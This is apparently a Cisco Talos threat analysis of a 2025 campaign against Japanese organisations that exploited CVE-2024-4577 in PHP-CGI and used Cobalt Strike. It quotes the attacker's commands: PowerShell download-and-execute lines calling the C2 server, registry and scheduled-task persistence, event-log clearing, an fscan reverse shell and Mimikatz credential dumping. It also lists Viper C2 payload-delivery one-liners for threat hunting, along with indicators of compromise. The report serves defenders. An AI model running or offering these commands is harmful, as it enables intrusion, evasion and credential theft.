@@ -1,0 +1,295 @@
+Unmasking the new persistent attacks on Japan
+By Chetan Raghuprasad
+
+Thursday, March 6, 2025 06:00
+Threats Threat Spotlight
+Cisco Talos discovered malicious activities conducted by an unknown attacker since as early as January 2025, predominantly targeting organizations in Japan.  
+The attacker has exploited the vulnerability CVE-2024-4577, a remote code execution (RCE) flaw in the PHP-CGI implementation of PHP on Windows, to gain initial access to victim machines.  
+The attacker utilizes plugins of the publicly available Cobalt Strike kit "TaoWu" for-post exploitation activities. 
+Talos found a pre-configured installer script on the command and control (C2) server that deploys a full suite of adversarial tools and frameworks hosted on an Alibaba cloud container Registry, highlighting the potential misuse of such tools for malicious purposes by the attacker. 
+Talos noticed the attacker’s attempt at stealing the victim’s machine credentials. However, we assess with moderate confidence that the attacker's motive extends beyond just credential harvesting, based on our observation of other post-exploitation activities, such as establishing persistence, elevating to SYSTEM level privilege, and potential access to adversarial frameworks, indicating the likelihood of future attacks. 
+We reported an increasing trend of threat actors exploiting vulnerable public facing applications for initial access in our quarterly Talos Incident Response (Talos IR) report for Q4 2024, and the discovery of this intrusion highlights this ongoing activity.  
+Victimology  
+We found that the attacker predominantly targets organizations in Japan across various business verticals, including technology, telecommunications, entertainment, education, and e-commerce, based on our analysis of command and control (C2) server artefacts.  
+
+
+Attack overview  
+The attacker attempts to compromise the victim machine using an exploit program targeting the vulnerability CVE-2024-4577, a remote code execution (RCE) flaw in the PHP-CGI implementation of PHP on Windows. In the event of successful exploitation, the attacker executes PowerShell script to run Cobalt Strike reverse HTTP shellcode, ensuring remote access to the victim machine.  
+
+Then, they begin reconnaissance by gathering system details and user privileges. They execute privilege escalation exploit programs, such as JuicyPotato, RottenPotato, and SweetPotato, to gain SYSTEM-level access. They establish persistence by modifying registry keys, adding scheduled tasks, and creating malicious services using the plugins of the Cobalt Strike kit called “TaoWu.”  
+
+To maintain stealth, they erase event logs using wevtutil commands, removing traces of their actions from the Windows security, system, and application logs. They further perform network reconnaissance using “fscan.exe” and “Seatbelt.exe” to map out potential lateral movement targets. The attacker has also attempted to abuse Group Policy Objects using “SharpGPOAbuse.exe” to execute malicious PowerShell scripts across the network. Eventually, they execute Mimikatz commands to dump and exfiltrate passwords and NTLM hashes from memory on the victim’s machine.  
+
+
+Initial access 
+Talos discovered that the attacker gains initial access to the victim’s network by exploiting the vulnerability CVE-2024-4577.  
+
+CVE-2024-4577 is a critical remote code execution (RCE) vulnerability in Windows-based PHP installations using CGI configurations. It arises from the "Best-Fit" behavior in Windows code pages, where certain characters are replaced in command-line inputs. The flaw in the PHP-CGI module misinterprets these characters as PHP options, allowing attackers to execute arbitrary PHP code on the server when using Apache with a vulnerable PHP-CGI setup.  
+
+To target the vulnerability, the attacker leverages a publicly available exploit Python script “PHP-CGI_CVE-2024-4577_RCE.py”. The script checks to see if a specific URL is vulnerable to the CVE-2024-4577 vulnerability. It does this by sending a specifically crafted POST request to a target URL with PHP code designed to trigger the vulnerability. If the response contains the MD5 hash “e10adc3949ba59abbe56e057f20f883e”, it indicates a successful exploitation. Then, the exploit script prompts the user to input commands as PHP code that are executed on the vulnerable servers and gets the response displayed to the attacker.  
+
+
+Snippet of the CVE-2024-4577 exploit script.
+In this intrusion, we found that the attacker has executed an embedded PowerShell command in the PHP code to trigger the infection.  
+
+<?php system ('powershell -c "Invoke-Expression (New-Object System.Net.WebClient).DownloadString(\'http[://]38[.]14[.]255[.]23[:]8000/payload[.]ps1\')"');?>
+The attacker triggers the infection by executing the PowerShell command through the PHP code, leading to the download and execution of a PowerShell injector script from the C2 server on the victim machine memory.  
+
+The PowerShell injector script is embedded with either base64-encoded or a hexadecimal data blob of the Cobalt Strike reverse http shellcode. Upon execution, it injects and executes the Cobalt Strike reverse HTTP shellcode on the victim machine’s memory and connects to the Cobalt Strike server running on the C2 server over HTTP, enabling remote access to the victim machine.  
+
+
+Sample PowerShell injector script. 
+The shellcode connects to the C2 server 38[.]14[.]255[.]23 through HTTP using the port 8077 and the URL paths “/6Qeq” or “/jANd”. The attacker has used one of the two HTTP header’s user agents.  
+
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; LEN2)
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; BOIE9; ENUS)
+
+Snippet of the Cobalt Strike reverse HTTP shellcode. 
+Post-exploitation activities 
+After gaining remote access to the victim machine through Cobalt Strike reverse HTTP shellcode, the attacker remotely executes commands on the victim machine from the Cobalt Strike server that is configured with plugins from the “TaoWu” Cobalt Strike kit (hxxps[://]github[.]com/pandasec888/taowu-cobalt_strike) to perform the post-exploitation tasks. 
+
+Below are the post-exploitation commands that we observed in this attack that relate to the MITRE ATT&CK framework. 
+
+Reconnaissance  
+ATT&CK Technique: System Owner/User Discovery (T1033) 
+
+The attacker gathers the victim’s system and user information and also checks the time synchronization by remotely executing the following commands on the victim machine.  
+
+whoami  /all 
+dir 
+net time 
+Privilege escalation
+ATT&CK Technique: Exploitation for Privilege Escalation (T1068) 
+
+The attacker attempts to elevate the user privileges by executing privilege escalation exploits, including JuicyPotato, RottenPotato, and SweetPotato. These Potato exploits abuse the Windows method of handling authentication and impersonation tokens to escalate privileges from a low-privileged user to SYSTEM user.   
+
+Microsoft has already patched the flaws that these exploits target in Windows 10 and Windows Server 2012, 2016, and 2019, as well as in the latest versions. However, if a Windows process has “SeImpersonatePrivilege” permission enabled that allows a process to impersonate another user’s security token, it could still be abused for privilege escalation using JuicyPotato, SweetPotato, and RottenPotato.  
+
+The attacker uses Ladon[.]exe, a plugin of the “TaoWu” Cobalt Strike kit, to bypass the user access controls in the victim machine.  
+
+Ladon.exe BypassUac C:\Windows\Temp\123.exe 
+Persistence 
+ATT&CK Technique: Modify Registry (T1112) 
+
+ATT&CK Technique: Scheduled task/job (T1053)  
+
+ATT&CK Technique: Create or Modify System Process (T1543)  
+
+The attacker leverages the “reg add” command and other .NET plugins of the TaoWu Cobalt Strike kit to modify the registry keys and create the Windows scheduled tasks to establish persistence on the victim machine. 
+
+The attacker executes the “reg add” command to add the path of the beacon executable to the Run registry key. 
+
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d "C:\Windows\system32\cmd.exe" /f C:\Windows\Temp\payload.exe 
+The attacker runs “sharpTask.exe”, a .NET program used to schedule a task on the Windows machine. 
+
+sharpTask.exe --AddTask Computer|local|hostname|ip 24h:time|12:30 \ some Service "Some Service" C:\Windows\Temp\payload.exe 
+They run “SharpHide.exe”, the utility used to create a hidden registry key.  
+
+SharpHide.exe action=create keyvalue="C:\Windows\Temp\123.exe" 
+They also run “SharpStay.exe”, a .NET tool used to create a service in the Windows machine.  
+
+SharpStay.exe action=CreateService servicename=Debug command="C:\Windows\tmp\payload.exe" 
+Detection evasion
+ATT&CK Technique: Indicator Removal on Host: Clear Windows Event Logs (T1070.001) 
+
+The attacker erases evidence of their activity on the victim machine by clearing the Windows event logs on the compromised endpoint using the living-off-the-land binary (LoLBin) “wevtutil.exe”.  
+
+wevtutil cl security 
+wevtutil cl system 
+wevtutil cl application 
+wevtutil cl windows powershell 
+Lateral movement  
+ATT&CK Technique: Lateral Tool Transfer (T1570) 
+
+The attacker uses fscan.exe, an open-source network scanning utility, and Seatbelt, a tool used to collect detailed information about a system—such as remote access configurations, network shares, and other security-relevant data on victim machine —to perform network reconnaissance and lateral movement in the victim network.  
+
+The attacker uploads the utility “fscan.exe” from the C2 server to the “C:\Windows\Temp” directory on the victim machine. 
+
+upload /"C2 server path"/fscan.exe 
+The attacker runs the .NET program “Seatbelt.exe” to gather the remote access-related information of the victim machine. 
+
+Seatbelt.exe -group=Remote -full 
+The attacker runs “SharpGPOAbuse.exe”, a tool used to abuse group policy objects (GPOs) for malicious purposes. The attacker creates a scheduled task via GPO named "update" that runs a PowerShell command across the network, which downloads and executes the attacker's PowerShell payload. 
+
+SharpGPOAbuse.exe --AddComputerTask --TaskName "update" --Author DOMAINAdmin --Command "cmd.exe" --Arguements "/c powershell.exe -nop -w hidden -c "IEX ((new-object new.webclient).downloadstring('http[://]38[.]14[.]255[.]23[:]8000/payload.ps1\'))"" --GPOName "Default Server Policy" 
+The attacker runs “fscan” to scan the local subnet of the victim’s network with a range of 256 IP addresses to discover other machines, ports, and services in the sub-network.  
+
+fscan.exe -h 192[.]168[.]1[.]1/24 
+The attacker locates SSH services that accept a public key, automating SSH brute-forcing by providing the public key (id_rsa.pub) to gain unauthorized access to SSH-enabled machines. They also attempt to brute-force SSH credentials for services running on a non-default port (2222). 
+
+fscan.exe -h 192[.]168[.]1[.]1/24 -rf id_rsa.pub 
+fscan.exe -h 192[.]168[.]1[.]1/24 -m ssh -p 2222 
+Using the fscan utility, the attacker opens a reverse shell, enabling the attacker to execute commands on victim machines in the subnet while connecting back to their server on port 6666, and executes the “whoami” command on the accessible machines. 
+
+fscan.exe -h 192[.]168[.]1[.]1/24 -rs 192.168.1.1:6666 
+fscan.exe -h 192[.]168[.]1[.]1/24 -c whoami 
+Credential access and exfiltration  
+ATT&CK Technique: OS Credential Dumping (T1003) 
+
+ATT&CK Technique: OS Credential Dumping: LSASS Memory (T1003.001) 
+
+ATT&CK Technique: Exfiltration Over C2 Channel (T1041) 
+
+The attacker executes Mimikatz commands to gather plaintext passwords and NTLM hashes from memory on the victim’s machine. 
+
+sekurlsa::logonpasswords 
+Attacker’s tradecraft has similarities with a hacker group 
+We observed the attacker exploiting the weakness in the vulnerable systems to gain initial access and execute Cobalt Strike reverse HTTP beacons to have continued remote access to the victim machine. They have used the Cobalt Strike kit “TaoWu” that has several plugins, including sharpTask.exe, SharpHide.exe, SharpStay.exe, Ladon.exe, and fscan, and Mimikatz  for post-exploitation activities.  
+
+Similar techniques were previously observed being used by the hacker group called “Dark Cloud Shield” or “You Dun” in their attacks in 2024, as reported by the DFIR Report.  
+
+However, we are not attributing the attacks to the “You Dun” group, as we did not observe any further activities after harvesting the victim machine credentials in the current intrusion. 
+
+
+Potential abuse of adversarial tools and frameworks 
+We discovered that the attacker has used two C2 servers with IP addresses 38[.]14[.]255[.]23 and 118[.]31[.]18[.]77 hosted on Alibaba cloud running the Cobalt Strike team server. During our research period, we noticed that the attacker has left the directory listings and access of the root folder to the internet in the C2 server 38[.]14[.]255[.]23, according to our OSINT research artefacts.  
+
+We found PowerShell scripts, Cobalt Strike beacon executables, and exploit programs along with the attacker’s command execution history logs in the C2 server’s exposed folder. Our further analysis of the contents of the exposed folder showed that the attacker had downloaded and executed a pre-configured installer shellscript called  “LinuxEnvConfig.sh” from the repository “yijingsec” on Gitee platform (hxxps[://]gitee[.]com/yijingsec/), a Chinese Git-based platform like GitHub. The author had described that the repository belongs to a network security talent training service provider called “Yijing Network Security Academy,” which indicates that the attacker is likely abusing the legitimate resource for malicious intention. 
+
+The shell script “LinuxEnvConfig.sh” appeared to be designed to configure foundational environments for Ubuntu, Debian, and Kali Linux systems and facilitates the setup of various publicly available offensive security frameworks and tools, including Vulfocus, Asset Reconnaissance Lighthouse (ARL), Viper C2, Starkiller, BeEF, and Blue-Lotus that are packaged and staged  as docker containers in the docker container registry called “registry[.]cn-shanghai[.]aliyuncs[.]com”, an Alibaba cloud container Registry (ACR) located in the Shangai, China, region.   
+
+We also found that the shellscript, when executed by a user, modifies the machine’s DNS settings, pointing to a specific DNS server with the IP address 114[.]114[.]114[.]114, which is a Chinese 114DNS service and is not used very often in other regions. 
+
+
+Menu-driven interface of the LinuxEnvConfig.
+We have continued to see various threat actors abusing publicly available tools, such as Cobalt Strike, Metasploit, ARL, Vulfocus, and PowerShell Empire for their malicious intentions. Still, we found that some of the tools and frameworks, such as Blue-Lotus, BeEF, and Viper C2, that the shell script “LinuxEnvConfig” deploys, were not seen very often being held in the possession of an attacker, and we have documented them further in the blog post to provide an overview of the capabilities and functionalities that an attacker could leverage by abusing such tools.  
+
+Blue-Lotus 
+Blue-Louts is a JavaScript webshell cross-site scripting attack framework. Blue-Lotus is docker-based and was developed by Firesun[.]me and the Blue Lotus team, a cybersecurity technology competition and research team from Tsinghua University. 
+
+
+Blue-Louts' administrative panel is in Chinese with an XSS receiving dashboard that displays the connection details of the victim machine, including the IP address and browser. 
+
+
+Blue-Lotus tool control panel. 
+Blue-Lotus has the payload generation panel where the user can generate the JavaScript webshell payload using the default JavaScript template from the tool’s database. An attacker using the framework can generate the webshell  and instrument them in their attacks to perform following tasks: 
+
+Cross-site scripting (XSS). 
+Screen capture of remote machine.  
+Get the reverse shell access to the remote machine.  
+Steal the browser cookies. 
+Creation of user ID and passwords in the Content Management System (CMS).  
+
+Blue-Lotus payload generation panel. 
+BeEF
+BeEF is a publicly available browser exploitation framework that an attacker can hook to one or more web browsers in the victim machine and execute commands within the browser context. BeEF has command modules that consist of JavaScript codes to perform the following tasks: 
+
+Check if the links, forms, and URI paths of the web page in a hooked browser are vulnerable to XSS. 
+Submit arbitrary requests on behalf of the hooked browser. 
+Interact with the host on the local network of the hooked browser. 
+Send commands to the victim systems through Web Real-Time Communication (WebRTC) caller.  
+
+BeEF tool dashboard. 
+Viper C2 
+The Viper C2 is a modular framework with multiple plugins and scripts that define its extensive functionalities. The C2 has built-in integration with the (MSF) meterpreter console and scripts.  
+
+Viper C2 has functionalities, such as: 
+
+Antivirus software bypass.  
+Intranet tunnel. 
+File management of the remote machine, such as upload and execute other executable files. 
+Remote command execution on compromised host. 
+Generate payloads of Meterpreter reverse shell in multiple forms that work on Windows, Linux, and MacOS. 
+Display the network topology of the compromised network. 
+
+Viper C2 control panel. 
+Viper C2 has the capability of generating the payload of Meterpreter HTTP and TCP reverse shell for multiple platforms, including Windows, Linux, MacOS, Android, Java, and Python. The payloads can be generated in different formats, such as EXE, DLL, ELF, ELF-SO, MSBuild, Macho, PowerShell script, PowerShell command, Python script, and HTA and VBA scripts.  
+
+ 
+
+ 
+
+Viper C2 payload generation panel. 
+
+Generated payloads are delivered to victims using the Viper C2 web delivery commands that the user can generate, including the delivery URL and instrument in their attacks.  
+
+
+Viper C2 web delivery panel. 
+We compiled some of the command formats generated from Viper C2 that assists defenders and threat hunters for hunting threats related to Viper C2, shown below: 
+
+Windows: 
+
+regsvr32 /s /n /u /i:hxxp[://]C2 server:port/SWLonxen.sct scrobj.dll 
+Linux: 
+
+wget -qO lYoSQUgn --no-check-certificate hxxp[://]C2 server:port/oegqPVin; chmod +x lYoSQUgn; ./lYoSQUgn& disown 
+PHP: 
+
+php -d allow_url_fopen=true -r "eval(file_get_contents(' :/bIBNfnlE', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false] ])));" 
+Python: 
+
+python -c "import sys;import ssl;u=import('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlope n',));r=u.urlopen(' :/wXAOAUIK', context=ssl._create_unverified_context());exec(r.read());" 
+PowerShell: 
+
+
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
+ 
+$pbFU=new-object net.webclient; 
+
+if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null)
+{$pbFU.proxy=[Net.WebRequest]::GetSystemWebProxy(); 
+
+$pbFU.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;}; 
+
+IEX ((new-objectNet.WebClient).DownloadString('C2 server:port/WyeslpUl/KaptrNuHdqhM')); 
+
+IEX ((new-objectNet.WebClient).DownloadString('C2 server:port’); 
+Linux download and execute: 
+
+wget -O 1737698200.elf --no-check-certificate hxxps[://]C2 server:port 
+/api/v1/d/?en=/6trTQMIGpJgIMksMielQg%3D%3D && chmod 755 
+1737698200.elf && ./1737698200.elf 
+Coverage 
+
+Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. 
+
+Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. 
+
+Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. 
+
+Cisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device. 
+
+Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. 
+
+Cisco Secure Access is a modern cloud-delivered Security Service Edge (SSE) built on Zero Trust principles.  Secure Access provides seamless transparent and secure access to the internet, cloud services or private application no matter where your users work.  Please contact your Cisco account representative or authorized partner if you are interested in a free trial of Cisco Secure Access. 
+
+Umbrella, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network.  
+
+Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.  
+
+Additional protections with context to your specific environment and threat data are available from the Firewall Management Center. 
+
+Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.  
+
+Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.  
+
+Snort SIDs for this threat: 
+
+Snort 2: 64632, 64633, 64630, 64631. 
+
+Snort 3: 301157, 301156. 
+
+Indicators of Compromise
+
+IPv4 addresses:
+38.14.255.23
+118.31.18.77
+
+C2 URLs:
+http://38.14.255.23:8077/6Qeq
+http://38.14.255.23:8077/jANd
+
+SHA256 hashes:
+a2f493769c0cd1cb3518571678f071588d683703ed368830f15405c1eb4028b2
+73d908725a08dcfebf300ef187dab1c5ba1c3cba8343c678df49335ba7e89e47
+83290b2f6e7b3fb1bcfa90ed1e550acaeb85c7dc0cb4476b35818436af9395d2
+cec655cc4c6bfcbc336d3afc4e5537e619bcf58329d291a51f39b3d3a250e962
+ccedc244ad5933537231139e24b4cad0df3e44d3b2944ef3b28dea5973396185
+f7396835d69675b138d0e2bee9b4ceb0a048bf705cb2f1012f1eee51e406d6e6
+6b5a75dcc505ac1c065844be27ee6d4693ac51abfc04aaf9bbfc1a06e69a19fd
+ad5f610e8fb4f0d74d5d761532c8c8b2b9e01a2a402ba89389794d15ecca8337
+07d8a505492566daeb6174c312a4f7114dc60efcd1d17fef12ca0b8d6303fb2b
+8015b6036ecbae1f9e850af6bdf361d7598201cd4d4c55ae334ed72cf17ba94d
+0ff87724012499381266e5eb8481117ed4549f44fa88be2c517afee899c2179f
+829c5a07b065b15969ea8c519705d64fc4c1c39c05e898fc9abfbdb289c484d5
+3c6511b15e3b0e8c378a549347fa0f0745fd371aaa86206cb03528fdc0a23b29
